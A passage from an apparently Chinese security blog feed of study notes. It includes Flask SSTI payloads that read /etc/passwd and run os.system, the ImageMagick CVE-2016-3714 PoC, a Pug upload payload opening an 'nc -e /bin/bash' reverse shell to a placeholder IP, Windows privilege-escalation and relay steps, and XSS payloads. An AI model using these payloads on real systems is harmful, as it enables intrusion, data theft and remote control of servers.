***不正确的使用flask中的render_template_string方法会引发SSTI***        + xss漏洞：            <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/test/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)<br>    html = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>%(code)<br>    <span class="hljs-keyword">return</span> render_template_string(html)<br></code></pre></td></tr></table></figure>            由于code参数可控，被直接拼接进模板文件内容，当传入 `<script>alert(0)</script>` 时导致xss            * 修改一下代码：            <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/test/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span><br>    code = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#x27;</span>,code=code)<br></code></pre></td></tr></table></figure>            此时是安全的，传入js语句会被渲染时编码转义，此时***用户可控的是code变量，而不是模板文件内容***        + SSTI文件读取/命令执行：            * tips： `&#123;&#123;&#125;&#125;</code> 不仅可以传参，还可以在里面执行简单的表达式，例如 <code>?id=&#123;&#123;2*4&#125;&#125;</code> 会输出8</li></ul><ul><li><code>?id=&#123;&#123;config&#125;&#125;</code> 输出 flask 的全局变量</li><li>所以 flask 利用思路和 pug 相同：<ul><li>找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</li></ul></li><li>几个魔术方法：<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span>  返回类型所属的对象<br><span class="hljs-strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-strong">__base__</span>   返回该对象所继承的基类<br>// <span class="hljs-strong">__base__</span>和<span class="hljs-strong">__mro__</span>都是用来寻找基类的<br><br><span class="hljs-strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-strong">__init__</span>  类的初始化方法<br><span class="hljs-strong">__globals__</span>  对包含函数全局变量的字典的引用<br></code></pre></td></tr></table></figure></li><li>获取字符串类对象：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__<br>&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></li><li>寻找基类的可用引用：<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()<br>    [&lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;]<br></code></pre></td></tr></table></figure></li><li>可以看到 <code>&lt;type &#39;file&#39;&gt;</code></li><li>利用： <code>?id=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;</code></li></ul></li><li><p>命令执行:</p><ul><li>思路和构造文件读取的一样: <strong><em>寻找包含os模块的脚本</em></strong><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> item.__init__.__globals__:<br>            <span class="hljs-built_in">print</span> num,item<br>        num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;-&#x27;</span><br>        num+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li>利用： <code>?id=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')&#125;&#125;</code><ul><li>结果不会回显，可用 <code>curl</code> 命令传回vps</li></ul></li></ul></li><li><p>bypass payload:</p><blockquote><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p></blockquote></li></ul></li></ul></li></ul><p>​        </p><p>​    </p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>旧的归档</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杂文2</title>
    <link href="/2021/02/03/%E6%9D%82%E6%96%872/"/>
    <url>/2021/02/03/%E6%9D%82%E6%96%872/</url>
    
    <content type="html"><![CDATA[<h1 id="NOTE-2020-3-6"><a href="#NOTE-2020-3-6" class="headerlink" title="NOTE-2020/3/6"></a>NOTE-2020/3/6</h1><h2 id="CVE-2016-3714-ImageMagick-命令执行"><a href="#CVE-2016-3714-ImageMagick-命令执行" class="headerlink" title="CVE-2016-3714 - ImageMagick 命令执行"></a>CVE-2016-3714 - ImageMagick 命令执行</h2><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p></blockquote><ul><li>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">MagickExport <span class="hljs-keyword">int</span> <span class="hljs-title">ExternalDelegateCommand</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MagickBooleanType asynchronous, <span class="hljs-keyword">const</span> MagickBooleanType verbose,<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *command,<span class="hljs-keyword">char</span> *message,ExceptionInfo *exception)</span></span><br><span class="hljs-function">sanitize_command</span>=SanitizeDelegateCommand(command);<br><span class="hljs-keyword">if</span> ((asynchronous != MagickFalse) ||<br>      (<span class="hljs-built_in">strpbrk</span>(sanitize_command,<span class="hljs-string">&quot;&amp;;&lt;&gt;|&quot;</span>) != (<span class="hljs-keyword">char</span> *) <span class="hljs-literal">NULL</span>))<br>    status=system(sanitize_command);<br></code></pre></td></tr></table></figure>可以看到使用了 <code>system</code> 函数执行委托中的 <code>command</code> 内容。</li></ul><p>在他的委托配置里可以看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">delegate</span> <span class="hljs-attr">decode</span>=<span class="hljs-string">&quot;https&quot;</span> <span class="hljs-attr">command</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;quot;</span>curl<span class="hljs-symbol">&amp;quot;</span> -s -k -o <span class="hljs-symbol">&amp;quot;</span>%o<span class="hljs-symbol">&amp;quot;</span> <span class="hljs-symbol">&amp;quot;</span>https:%M<span class="hljs-symbol">&amp;quot;</span>&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到%M被拼接在command里,%M代表图片的远程路径。</p><ul><li>这个委托指远程加载https图片，先使用curl下载，%M指代远程路径，因此我们可以使用 <code>&quot;</code> 闭合掉url,然后执行命令。</li><li>当 <code>%M</code> 为 : <code>https://&quot;|id &amp;&amp; ls -al /etc/passwd&quot;</code>，原命令变为 <code>command=&quot; &quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https://&quot;|id &amp;&amp; ls -al /etc/passwd&quot;&quot; &quot;/&gt;</code>。</li><li>因此构造poc.mvg(mvg图片为远程图片，可以包含url)<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<br>fill &#x27;url(https://<span class="hljs-string">&quot;|id; &quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure>漏洞poc : <a href="https://github.com/ImageTragick/PoCs">https://github.com/ImageTragick/PoCs</a></li></ul><h2 id="Nodejs-Rce"><a href="#Nodejs-Rce" class="headerlink" title="Nodejs Rce"></a>Nodejs Rce</h2><p>使用 Node，我们不能只通过 Web 浏览器调用文件来执行文件，就像在 PHP 中一样。因此，在这种情况下，我们将使用动态路由端点尝试呈现 Pug 文件的内容。</p><ul><li><p>在上传过程中，文件处理程序模块会将文件重命名为随机字符串，没有扩展名。上传的响应会返回路径</p></li><li><p>payload：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml">-<span class="hljs-keyword">var</span> <span class="hljs-symbol">x</span> = <span class="hljs-literal">global</span>.process.mainModule.require<br>-<span class="hljs-symbol">x</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;nc [Your_IP] 8888 -e /bin/bash</span><br></code></pre></td></tr></table></figure></li><li><p>注： 在pug中，<code>&quot;-&quot;</code> 表示执行js</p></li><li><p>上传成功后会返回路径</p></li><li><p>访问 <code>[网站地址]/drouting?filename=../uploads/[你的文件哈希]</code> 即可触发命令执行，服务器将回去连接你的vps的8888端口。</p></li><li><p>另附：webshell列表</p><blockquote><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p></blockquote></li></ul><h2 id="红队攻击"><a href="#红队攻击" class="headerlink" title="红队攻击"></a>红队攻击</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>没啥好说的</p><h3 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h3><ul><li><p>responder</p></li><li><p>MultiRelay</p><ul><li>如果不强制smb签名（可以通过nmap获知：<a href="https://nmap.org/nsedoc/scripts/smb-security-mode.html">https://nmap.org/nsedoc/scripts/smb-security-mode.html</a> ）我们何以使用MultiRelay进行中继。</li><li>步骤：<ol><li>编辑 Responder 配置文件以禁用 SMB 和 HTTP 服务器</li><li><code>python ./Responder.py -I eth0 -rv</code></li><li><code>·cd /opt/Responder/tool &amp;&amp; ./MultiRelay.py -t -c -u AL</code></li><li>成功中继的话可以生成基础shell</li></ol></li></ul></li><li><p>利用kerberos枚举用户</p><ul><li><code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=“cyberspacekittens.local”,userdb=/opt/userlist.txt</code> - 需要准备用户列表，但是由于我们只是查询 DC 而没有对其进行身份验证，因此通常此行动不会被检测。</li></ul></li><li><p>命令查找工具<br>记不住的windows命令可以通过这个查找：</p><blockquote><p><a href="https://github.com/leostat/rtfm">https://github.com/leostat/rtfm</a></p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#更新并运行</span><br><span class="hljs-keyword">cd</span> <span class="hljs-string">/opt/rtfm</span><br>chmod +x rtfm.py<br><span class="hljs-string">./rtfm.py</span> -u<br><span class="hljs-string">./rtfm.py</span> -c ‘rtfm’<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#列出所有标签</span><br><span class="hljs-string">./rtfm.py</span> -D<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#搜索标签下的命令</span><br>./rtfm.py -t enumeration <span class="hljs-string">| m</span><br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3></li><li><p>可信任服务路径提权</p><p>windows中的服务一般都是高权限运行，如果服务的路径未被引用且有空格，那windows会先去匹配空格前部的应用名，例如：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew folder<span class="hljs-symbol">\p</span>lay hack.exe<br></code></pre></td></tr></table></figure><p>系统的匹配顺序为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew.exe<br>c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew folder<span class="hljs-symbol">\p</span>lay.exe<br>c:<span class="hljs-symbol">\p</span>rogrames<span class="hljs-symbol">\n</span>ew folder<span class="hljs-symbol">\p</span>lay hack.exe<br></code></pre></td></tr></table></figure><p>所以哦我们寻找未安全引用的服务路径并上传恶意程序。</p><p>查找漏洞：<code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\&quot; |findstr/i /v &quot;&quot;&quot;</code></p><p>icacls 可以查看文件夹权限：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(M)</span>代表修改权限，<span class="hljs-comment">(F)</span>代表完全控制，<span class="hljs-comment">(CI)</span>代表从属容器将继承访问控制项，<span class="hljs-comment">(OI)</span>代表从属文件将继承访问控制项。<br></code></pre></td></tr></table></figure></li><li><p>系统服务错误配置</p><p>系统服务一般是开机自动加载，且以system权限运行，如果一个低权限用户拥有对可执行文件写的权力，则可以更改可执行文件，写入恶意shell。</p></li><li><p>不安全的注册表权限配置</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>旧的归档</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杂文3</title>
    <link href="/2021/02/03/%E6%9D%82%E6%96%873/"/>
    <url>/2021/02/03/%E6%9D%82%E6%96%873/</url>
    
    <content type="html"><![CDATA[<h1 id="NOTE-2020-3-3-工具"><a href="#NOTE-2020-3-3-工具" class="headerlink" title="NOTE-2020/3/3 工具"></a>NOTE-2020/3/3 工具</h1><h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><blockquote><p><a href="https://github.com/davidtavarez/pwndb">https://github.com/davidtavarez/pwndb</a></p></blockquote><h2 id="输出邮件列表"><a href="#输出邮件列表" class="headerlink" title="输出邮件列表"></a>输出邮件列表</h2><blockquote><p><a href="https://github.com/SimplySecurity/SimplyEmail">https://github.com/SimplySecurity/SimplyEmail</a></p></blockquote><h2 id="子域名劫持"><a href="#子域名劫持" class="headerlink" title="子域名劫持"></a>子域名劫持</h2><blockquote><p><a href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a></p></blockquote><h2 id="在github仓库搜集敏感信息"><a href="#在github仓库搜集敏感信息" class="headerlink" title="在github仓库搜集敏感信息"></a>在github仓库搜集敏感信息</h2><blockquote><p><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a></p></blockquote><h2 id="信息收集框架"><a href="#信息收集框架" class="headerlink" title="信息收集框架"></a>信息收集框架</h2><blockquote><p><a href="https://github.com/leebaird/discover">https://github.com/leebaird/discover</a></p></blockquote><h2 id="扫描网络并输出网站图片"><a href="#扫描网络并输出网站图片" class="headerlink" title="扫描网络并输出网站图片"></a>扫描网络并输出网站图片</h2><blockquote><p><a href="https://github.com/breenmachine/httpscreenshot">https://github.com/breenmachine/httpscreenshot</a></p></blockquote><h2 id="fuzz字典"><a href="#fuzz字典" class="headerlink" title="fuzz字典"></a>fuzz字典</h2><blockquote><p>　<a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content">https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content</a></p></blockquote><h2 id="xss-payload"><a href="#xss-payload" class="headerlink" title="xss payload"></a>xss payload</h2><blockquote><p><a href="http://www.xss-payloads.com/payloads-list.html">http://www.xss-payloads.com/payloads-list.html</a><br><a href="https://github.com/foospidy/payloads/tree/master/other/xss">https://github.com/foospidy/payloads/tree/master/other/xss</a></p></blockquote><h2 id="xss混淆"><a href="#xss混淆" class="headerlink" title="xss混淆"></a>xss混淆</h2><blockquote><p><a href="https://github.com/foospidy/payloads/tree/master/other/xss">https://github.com/foospidy/payloads/tree/master/other/xss</a></p></blockquote><h2 id="经典xss事件"><a href="#经典xss事件" class="headerlink" title="经典xss事件"></a>经典xss事件</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">XSS</span>&#x27;)&gt;</span>Click Me!<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://test.cyberspacekittens.com&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie);</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="浏览器xss"><a href="#浏览器xss" class="headerlink" title="浏览器xss"></a>浏览器xss</h2><blockquote><p><a href="https://html5sec.org/">https://html5sec.org/</a></p></blockquote><h2 id="xss-polyglot"><a href="#xss-polyglot" class="headerlink" title="xss polyglot"></a>xss polyglot</h2><blockquote><p><a href="http://bit.ly/2GXxqxH">http://bit.ly/2GXxqxH</a></p></blockquote><h2 id="linux提权dfg"><a href="#linux提权dfg" class="headerlink" title="linux提权dfg"></a>linux提权dfg</h2><blockquote><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>旧的归档</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杂文4</title>
    <link href="/2021/02/03/%E6%9D%82%E6%96%874/"/>
    <url>/2021/02/03/%E6%9D%82%E6%96%874/</url>
    
